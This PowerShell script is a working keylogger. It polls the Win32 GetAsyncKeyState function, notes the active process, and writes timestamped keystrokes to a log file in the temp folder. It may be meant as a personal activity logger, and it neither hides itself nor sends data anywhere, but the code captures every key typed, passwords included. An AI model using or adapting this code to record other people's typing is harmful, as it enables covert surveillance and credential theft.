﻿## Def
# API declaration
$APIsignaturesWin32 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

$API = Add-Type -MemberDefinition $APIsignaturesWin32 -Name 'Win32' -Namespace API -PassThru

$APIsignaturesUtils = @'
[DllImport("user32.dll")]
public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")]
public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out int ProcessId);
'@

Add-Type $APIsignaturesUtils -Name Utils -Namespace Win32
$myPid = [IntPtr]::Zero;

## Sub Functions
function get-activewin()
{
  $hwnd = [Win32.Utils]::GetForegroundWindow()
  $null = [Win32.Utils]::GetWindowThreadProcessId($hwnd, [ref] $myPid)
  $activewin = Get-Process| Where-Object ID -eq $myPid | Select-Object *
  # return
  $activewin
}

function output-line($logPath, $ary_str, $cnt){
  $activewin = get-activewin
  $arylst = New-Object System.Collections.ArrayList
  $null = $arylst.Add((Get-Date).ToString($C_dateformat))
  $null = $arylst.Add($activewin.Id)
  $null = $arylst.Add($cnt)
  $null = $arylst.Add($ary_str)
  $ary = $arylst.ToArray()
  $line = [String]::Join("`t", $ary)
  
  Add-Content -Path $logPath -Value $line -Encoding $C_Encode
  if($C_debug_mode){
    # $logger.info.Invoke("logPath=$logPath")
    # $logger.info.Invoke("cnt=$cnt")
    # $logger.info.Invoke("ary_str=$ary_str")
    $logger.info.Invoke("line=$line")
  }
}

## function
function Log-Keystrokes($logPath="$env:temp\Keystrokes.txt") 
{
  # output file path
  if (Test-Path $logPath){
    $null
  }else{
    $null = New-Item -Path $logPath -ItemType File
    $line = "datetime`tprocessid`tcount`tkeystrokes"
    Add-content -Path $logPath  -Value "$line`r`n" -Encoding $C_Encode
  }
  # buf
  $arylst = New-Object System.Collections.ArrayList
  $buf = ''
  
  try
  {
    $logger.warn.Invoke('Keylogger started. Press CTRL+C to see results...')
    $logger.info.Invoke("Output keystroke log to ... $logPath")
    
    $cnt = 0
    while ($true) {
      Start-Sleep -Milliseconds $C_waittime
      $starttime = Get-Date
      $flag = $true
      
      while ($flag) {
        for ($btKeyCode = 0; $btKeyCode -le 254; $btKeyCode++) {
          ## FIXME [ ] How can I get WheeelUp and WheelDown,etc.
          
          ## get key state
          $keystate = $API::GetAsyncKeyState($btKeyCode)
          
          ## if key pressed
          if ($keystate -eq -32767) {
            $null = [console]::CapsLock ##FIXME Why this line is written?
            $val = (Get-ItemProperty -path 'HKCU:\Software\GetKeypressValue').KeypressValue
            
            if($val.length -le 1){
              $buf = $buf + $val
              $cnt = $cnt + 1
            }else{
              if($buf -ne ""){
                $null = $arylst.Add($buf)
              }
              if($C_exclusion_words -notcontains $val){
                if($val.length -ne 0){
                  $null = $arylst.Add($val)
                  $cnt = $cnt + 1
                }
              }
              $buf = ""
            }
          }
          $endtime = Get-Date
          $secondstosleep = [int]($C_interval - ($endtime - $starttime).TotalSeconds)
          if($secondstosleep -le 0){
            $flag = $false
          } 
        }
      }
      $ary = $arylst.ToArray()
      $ary_str = [string]::Join(",",$ary)
      # if($C_debug_mode){
      #   $logger.info.Invoke("logPath=$logPath")
      #   $logger.info.Invoke("cnt=$cnt")
      #   $logger.info.Invoke("ary_str=$ary_str")
      # }
      output-line $logPath $ary_str $cnt
      $cnt = 0
      $buf = ''
      $arylst.Clear()
    }
  }
  finally
  { 
    $null = $arylst.Add($buf)
    $ary = $arylst.ToArray()
    $ary_str = [string]::Join(",",$ary)
    $cnt = $buf.length + $ary.length - 1
    output-line $logPath $ary_str $cnt
  }
}

## ---------------------------------------------------- // entry point
## include configs
$project_name = split-path $PWD.path -leaf
$config = "./$project_name.config.ps1"
. $config

## include logger
. ./Get-Logger.ps1

$logger = Get-Logger
$logger.info.Invoke("get config from $config")

Log-Keystrokes $C_output_path
